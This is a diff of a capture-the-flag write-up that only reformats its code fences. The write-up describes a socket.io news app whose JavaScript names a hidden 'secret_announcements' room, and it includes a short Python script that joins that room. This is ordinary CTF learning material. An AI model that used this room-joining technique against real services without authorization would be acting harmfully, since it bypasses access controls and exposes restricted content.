@@ -31,12 +31,12 @@ ws://k-newswire.task.sasc.tf:8000/socket.io/?EIO=4&transport=websocket
 
 Even more interestingly, the JS defined some rooms used by the app:
 
-`
+```
 const kh = Object.freeze({
   public: "public",
   secret_announcements: "secret_announcements"
 });
-`
+```
 
 
 So the app connects users to the public room normally, but there exists a hidden room called secret_announcements.
@@ -47,7 +47,7 @@ Exploitation
 
 To interact with the socket, I wrote a quick Python script using python-socketio:
 
-`
+```
 import socketio
 
 sio = socketio.Client()
@@ -69,7 +69,7 @@ sio.emit("join", {"room": "public"})
 sio.emit("join", {"room": "secret_announcements"})
 
 sio.wait()
-`
+```
 
 
 
